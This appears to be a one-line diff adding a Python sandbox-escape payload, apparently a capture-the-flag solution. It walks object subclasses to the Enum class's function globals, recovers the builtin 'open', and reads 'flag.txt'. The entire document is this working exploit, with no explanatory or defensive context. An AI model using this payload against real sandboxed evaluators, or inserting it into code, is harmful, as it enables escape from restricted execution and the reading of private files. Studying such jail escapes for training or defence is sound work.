@@ -1,0 +1,1 @@
+_eval return [i for i in ().__class__.__base__.__subclasses__() if i.__name__ == "Enum"][0].__repr__.__globals__["__builtins__"]["open"]("flag.txt").read()
